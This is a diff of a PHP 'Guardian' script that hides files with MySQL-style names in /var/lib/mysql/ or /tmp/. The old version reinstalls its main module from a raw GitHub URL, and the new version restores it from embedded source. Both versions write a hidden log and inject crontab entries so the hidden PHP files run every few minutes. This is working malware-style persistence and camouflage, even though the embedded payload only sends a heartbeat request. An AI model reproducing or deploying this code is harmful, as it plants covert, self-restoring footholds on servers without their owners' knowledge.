@@ -1,37 +1,42 @@
 <?php
-$baseGit = "https://raw.githubusercontent.com/0pt1mist/crontab-test/main/";
-$targetDir = "/var/lib/mysql/";
-if (!is_writable($targetDir)) $targetDir = "/tmp/";
+error_reporting(0);
 
-$sysHash = substr(md5(gethostname()), 0, 5);
-$name1 = "mysql_db_query_" . $sysHash . ".php";
+$targetDir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
+$sysHash = substr(md5(gethostname()), 0, 4);
+$name1 = "mysql_daemon_" . $sysHash . ".php";
+$name2 = "mysql_lib_" . $sysHash . ".php";
 $path1 = $targetDir . $name1;
-$sharedLog = $targetDir . ".mysql_system.log";
+$path2 = $targetDir . $name2;
+$logFile = $targetDir . ".mysql_audit.log";
 
 function writeLog($msg) {
-    global $sharedLog;
-    $date = date("Y-m-d H:i:s");
-    $content = "[$date] [GUARDIAN]: $msg\n";
-    file_put_contents($sharedLog, $content, FILE_APPEND);
+    global $logFile;
+    file_put_contents($logFile, "[" . date("Y-m-d H:i:s") . "] [Guardian]: $msg\n", FILE_APPEND);
 }
+
+$file1_source = '<?php
+$dir = (is_writable("/var/lib/mysql/")) ? "/var/lib/mysql/" : "/tmp/";
+$hash = substr(md5(gethostname()), 0, 4);
+$n1 = "mysql_daemon_" . $hash . ".php";
+$log = $dir . ".mysql_audit.log";
+$ch = curl_init("https://google.com");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_exec($ch);
+file_put_contents($log, "[" . date("Y-m-d H:i:s") . "] [Main]: Restored version heartbeat.\n", FILE_APPEND);
+?>';
 
 if (!file_exists($path1)) {
-    writeLog("CRITICAL: Main module missing! Recovering from Git...");
-    $code = @file_get_contents($baseGit . "file1.php");
-    if ($code) {
-        file_put_contents($path1, $code);
-        chmod($path1, 0755);
-        writeLog("Main module recovered.");
-    }
+    writeLog("CRITICAL: File1 missing! Emergency offline recovery...");
+    file_put_contents($path1, $file1_source);
+    chmod($path1, 0755);
 }
 
-$currentCron = shell_exec("crontab -l 2>/dev/null");
-if (strpos($currentCron, $name1) === false) {
-    writeLog("Fixing crontab entry for Main module.");
-    $job1 = "* * * * * /usr/bin/php $path1 > /dev/null 2>&1\n";
-    file_put_contents("/tmp/.c", $currentCron . $job1);
-    exec("crontab /tmp/.c && rm /tmp/.c");
+$cron = shell_exec("crontab -l 2>/dev/null");
+if (strpos($cron, $name2) === false) {
+    $job = "*/5 * * * * php $path2 > /dev/null 2>&1\n";
+    file_put_contents("/tmp/.c", $cron . $job);
+    shell_exec("crontab /tmp/.c");
+    writeLog("Guardian cron restored.");
 }
-
-writeLog("Integrity check complete. All systems nominal.");
+writeLog("Health check OK.");
 ?>
